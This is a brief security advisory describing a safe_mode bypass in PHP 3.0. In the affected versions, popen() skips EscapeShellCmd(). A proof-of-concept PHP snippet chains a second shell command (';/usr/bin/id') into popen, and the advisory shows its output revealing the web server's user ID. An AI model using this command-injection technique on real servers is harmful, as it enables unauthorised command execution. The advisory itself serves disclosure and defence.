source: http://www.securityfocus.com/bid/911/info

PHP Version 3.0 is an HTML-embedded scripting language. Much of its syntax is borrowed from C, Java and Perl with a couple of unique PHP-specific features thrown in. The goal of the language is to allow web developers to write dynamically generated pages quickly.

Because it runs on a webserver and allows for user implemented (and perhaps security relevant) code to be executed on it, PHP has built in a security feature called 'safe_mode' to control executed commands to the webroot environment which PHP operates in.

This is done by forcing any system call which executes shell commands to have their shell commands passed to the EscapeShellCmd() function which ensures the commands do not take place outside the webroot directory. 

Under certain versions of PHP however, the popen() command fails to be applied to the EscapeShellCmd() command and as such users can possibly exploit PHP applications running in 'safe_mode' which make of use of the 'popen' system call.

<?php
$fp = popen("ls -l /opt/bin; /usr/bin/id", "r");
echo "$fp<br>\n";
while($line = fgets($fp, 1024)):
printf("%s<br>\n", $line);
endwhile;
pclose($fp);

phpinfo();
?>

which gave me the following output

1
total 53 
-rwxr-xr-x 1 root root 52292 Jan 3 22:05 ls 
uid=30(wwwrun) gid=65534(nogroup) groups=65534(nogroup) 

and from the configuration values of phpinfo():

safe_mode 0 1